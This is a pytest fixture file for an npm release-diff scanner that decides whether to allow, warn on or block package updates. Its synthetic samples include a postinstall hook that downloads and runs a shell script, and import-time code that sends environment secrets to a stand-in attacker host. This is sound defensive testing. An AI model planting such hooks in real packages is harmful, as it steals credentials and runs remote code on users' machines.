"""Golden end-to-end fixtures for Release Sentinel Stage 2.5.

All test tarballs are synthetic, harmless, and generated in memory/temp directories.
No package code is executed (Rule 1).
No real malware or real credentials anywhere (Rule 6).
"""

from __future__ import annotations

import json
from pathlib import Path

from tests.conftest import make_package_json, make_tarball

from release_sentinel.differ import compare_releases
from release_sentinel.engine import decide
from release_sentinel.extractor import extract_release
from release_sentinel.models import Decision, Severity


def _extract_and_decide(tmp_path: Path, old_tgz: Path, new_tgz: Path):
    old = extract_release(old_tgz, tmp_path / "old")
    new = extract_release(new_tgz, tmp_path / "new")
    evidence = compare_releases(old, new)
    decision, limitations = decide(evidence)
    return decision, evidence, limitations


class TestGoldenFixtures:
    def test_golden_1_postinstall_downloads_and_executes_blocks(self, tmp_path: Path):
        """1. Update adds a postinstall script that downloads a URL and executes -> BLOCK."""
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": make_package_json(version="1.0.0"),
                "index.js": "module.exports = {};",
            },
        )
        postinstall_code = (
            "const https = require('https');\n"
            "const cp = require('child_process');\n"
            "https.get('https://example.com/setup.sh', (res) => {\n"
            "  cp.exec('sh setup.sh');\n"
            "});\n"
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": make_package_json(
                    version="1.0.1",
                    scripts={"postinstall": "node postinstall.js"},
                ),
                "index.js": "module.exports = {};",
                "postinstall.js": postinstall_code,
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.BLOCK
        ids = {e.id for e in evidence}
        assert "install_script_added" in ids
        assert "network_access" in ids or "process_exec" in ids

    def test_golden_2_import_time_env_enumeration_exfiltration_blocks(self, tmp_path: Path):
        """2. Update adds import-time code enumerating env vars and sending to new host -> BLOCK."""
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": make_package_json(version="1.0.0"),
                "index.js": "module.exports = function(a, b) { return a + b; };",
            },
        )
        exfil_code = (
            "const http = require('http');\n"
            "const token = process.env.API_KEY;\n"
            "const user = process.env.USER_TOKEN;\n"
            "const secret = process.env.APP_SECRET;\n"
            "http.get('https://attacker-domain-c2.net/collect?k=' + token + user + secret);\n"
            "module.exports = function(a, b) { return a + b; };\n"
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": make_package_json(version="1.0.1"),
                "index.js": exfil_code,
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.BLOCK
        ids = {e.id for e in evidence}
        assert "env_enumeration" in ids
        assert "network_access" in ids
        assert "hardcoded_url" in ids

    def test_golden_3_utility_library_calling_new_host_warns(self, tmp_path: Path):
        """3. A utility library that had no network code starts calling a new host -> WARN."""
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": make_package_json(version="1.0.0"),
                "index.js": "module.exports = function square(x) { return x * x; };",
            },
        )
        telemetry_code = (
            "function square(x) {\n"
            "  fetch('https://telemetry-collect.utility-metrics.io/event');\n"
            "  return x * x;\n"
            "}\n"
            "module.exports = square;\n"
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": make_package_json(version="1.0.1"),
                "index.js": telemetry_code,
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.WARN
        ids = {e.id for e in evidence}
        assert "network_access" in ids
        assert "hardcoded_url" in ids

    def test_golden_4_rebuilt_bundled_minified_file_with_test_fixture_blob_allows(
        self, tmp_path: Path
    ):
        """4. Rebuilt bundled/minified file with same capabilities + fixture blob -> ALLOW."""
        old_bundle = (
            "var a=1;function f1(){return new XMLHttpRequest();}function f2(r){return r.exec('t');}"
            + (" " * 450)
            + "\n"
        )
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": make_package_json(version="1.0.0"),
                "index.js": "module.exports = {};\n" * 50,
                "dist/bundle.min.js": old_bundle,
            },
        )
        # Rebuilt bundle: reordered, same capabilities
        new_bundle = (
            "var b=2;function f2(r){return r.exec('t');}function f1(){return new XMLHttpRequest();}"
            + (" " * 450)
            + "\n"
        )
        # Test fixture containing a long encoded blob
        test_fixture = (
            "const fixtureData = 'aGVsbG8gd29ybGQ=';\n"
            "const longBlob = '" + ("A" * 600) + "';\n"
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": make_package_json(version="1.0.1"),
                "index.js": "module.exports = {};\n" * 50,
                "dist/bundle.min.js": new_bundle,
                "tests/fixtures/blob.js": test_fixture,
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.ALLOW
        # Verify no blocking or warning evidence
        alerting_ids = {e.id for e in evidence if e.severity not in (Severity.INFO, Severity.LOW)}
        assert not alerting_ids, f"Unexpected alerting evidence: {alerting_ids}"

    def test_golden_5_dependency_version_bump_only_allows(self, tmp_path: Path):
        """5. Update only bumps a dependency version -> ALLOW."""
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": json.dumps({
                    "name": "my-pkg",
                    "version": "1.0.0",
                    "dependencies": {"lodash": "4.17.20"},
                }),
                "index.js": "module.exports = 1;",
            },
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": json.dumps({
                    "name": "my-pkg",
                    "version": "1.0.1",
                    "dependencies": {"lodash": "4.17.21"},
                }),
                "index.js": "module.exports = 1;",
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.ALLOW
        dep_ev = [e for e in evidence if e.id == "dependency_version_changed"]
        assert len(dep_ev) == 1
        assert dep_ev[0].severity == Severity.INFO

    def test_golden_6_dependency_added_only_allows_with_evidence_listed(self, tmp_path: Path):
        """6. Update adds one new dependency and nothing else -> ALLOW with evidence listed."""
        old_tgz = make_tarball(
            tmp_path / "old.tgz",
            {
                "package.json": json.dumps({
                    "name": "my-pkg",
                    "version": "1.0.0",
                    "dependencies": {"lodash": "4.17.20"},
                }),
                "index.js": "module.exports = 1;",
            },
        )
        new_tgz = make_tarball(
            tmp_path / "new.tgz",
            {
                "package.json": json.dumps({
                    "name": "my-pkg",
                    "version": "1.0.1",
                    "dependencies": {"lodash": "4.17.20", "chalk": "5.0.0"},
                }),
                "index.js": "module.exports = 1;",
            },
        )
        decision, evidence, _ = _extract_and_decide(tmp_path, old_tgz, new_tgz)
        assert decision == Decision.ALLOW
        dep_ev = [e for e in evidence if e.id == "dependency_added"]
        assert len(dep_ev) == 1
        assert dep_ev[0].severity == Severity.LOW
